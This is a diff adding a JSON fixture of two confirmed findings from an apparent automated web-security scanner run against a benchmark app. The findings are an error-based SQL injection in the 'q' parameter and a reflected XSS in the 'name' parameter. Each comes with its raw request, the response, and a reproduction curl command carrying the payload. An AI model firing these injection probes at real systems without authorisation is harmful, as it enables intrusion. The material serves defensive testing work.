@@ -1,0 +1,72 @@
+[
+  {
+    "id": "7776e626-d22e-4940-be6f-a565dad6b6ff",
+    "project_id": "47ebd341-d1fa-4c36-8843-347491f70b43",
+    "endpoint_id": null,
+    "wstg_id": "WSTG-INPV-05",
+    "title": "SQL Injection in 'q' Parameter (/sqli/search)",
+    "description": "Error-based SQL injection confirmed on /sqli/search?q= returning database syntax details or HTTP 500.",
+    "severity": "Critical",
+    "status": "Confirmed",
+    "confidence": "Confirmed",
+    "cvss_score": null,
+    "cvss_vector": null,
+    "cwe_id": "CWE-89",
+    "owasp_category": null,
+    "affected_parameter": "q",
+    "detection_source": "check_runner",
+    "remediation_guidance": null,
+    "business_impact": null,
+    "is_simulated": false,
+    "created_at": "2026-11-18T04:15:42.777939Z",
+    "updated_at": "2026-11-18T04:15:42.777941Z",
+    "evidence": [
+      {
+        "id": "c48fb9a3-bf51-4cc5-a9f4-e303724e17bd",
+        "finding_id": "7776e626-d22e-4940-be6f-a565dad6b6ff",
+        "raw_request": "GET /sqli/search?q=%27%29%29 HTTP/1.1\r\nHost: bench-pentesa-app:8080\r\n\r\n",
+        "raw_response": "HTTP/1.1 500\r\n\r\n{\"error\":\"SQL Error\",\"details\":\"near \\\")\\\": syntax error\",\"query\":\"SELECT id, name, description, price FROM products WHERE name LIKE '%'))%'\"}",
+        "reproduction_curl": "curl -i -s \"http://bench-pentesa-app:8080/sqli/search?q=%27%29%29\"",
+        "request_hash_sha256": "b6e1ab97874fe42e3073b9c7c714a27e1521d22d67159b3b981716beac76bd83",
+        "response_hash_sha256": "4867745e84e758f935921121f559ce272021846ea891eba8f603ac5fc7c9a4ad",
+        "screenshot_path": null,
+        "captured_at": "2026-11-18T04:15:42.779953Z"
+      }
+    ]
+  },
+  {
+    "id": "3838f7e2-3be8-4661-9d23-009dd23e903f",
+    "project_id": "47ebd341-d1fa-4c36-8843-347491f70b43",
+    "endpoint_id": null,
+    "wstg_id": "WSTG-INPV-01",
+    "title": "Reflected Cross-Site Scripting (XSS) in 'name' Parameter (/ssti/secure)",
+    "description": "Query parameter 'name' on /ssti/secure reflects unescaped executable <script> HTML markup directly into the text/html DOM response.",
+    "severity": "Medium",
+    "status": "Confirmed",
+    "confidence": "Confirmed",
+    "cvss_score": null,
+    "cvss_vector": null,
+    "cwe_id": "CWE-79",
+    "owasp_category": null,
+    "affected_parameter": "name",
+    "detection_source": "check_runner",
+    "remediation_guidance": null,
+    "business_impact": null,
+    "is_simulated": false,
+    "created_at": "2026-11-18T04:15:39.114402Z",
+    "updated_at": "2026-11-18T04:15:39.114405Z",
+    "evidence": [
+      {
+        "id": "c71e6a0e-9cb9-44c9-a676-9bf2423ade4e",
+        "finding_id": "3838f7e2-3be8-4661-9d23-009dd23e903f",
+        "raw_request": "GET /ssti/secure?name=%3Cscript%3Ealert%28%27pentesa_xss_8421%27%29%3C/script%3E HTTP/1.1\r\nHost: bench-pentesa-app:8080\r\n\r\n",
+        "raw_response": "HTTP/1.1 200\r\nContent-Type: text/html; charset=utf-8\r\n\r\n<html><body><h1>Hello <script>alert('pentesa_xss_8421')</script>!</h1></body></html>",
+        "reproduction_curl": "curl -i -s \"http://bench-pentesa-app:8080/ssti/secure?name=%3Cscript%3Ealert%28%27pentesa_xss_8421%27%29%3C/script%3E\"",
+        "request_hash_sha256": "5a6652b9c156d263753a638a3207d0ea50d5f8e5e585f3b09e5cc680b8960e84",
+        "response_hash_sha256": "34f4899511e7f76f722ac4e8a3b823d1c2cb8882bb2375ea34b4f273d65a4b12",
+        "screenshot_path": null,
+        "captured_at": "2026-11-18T04:15:39.116809Z"
+      }
+    ]
+  }
+]
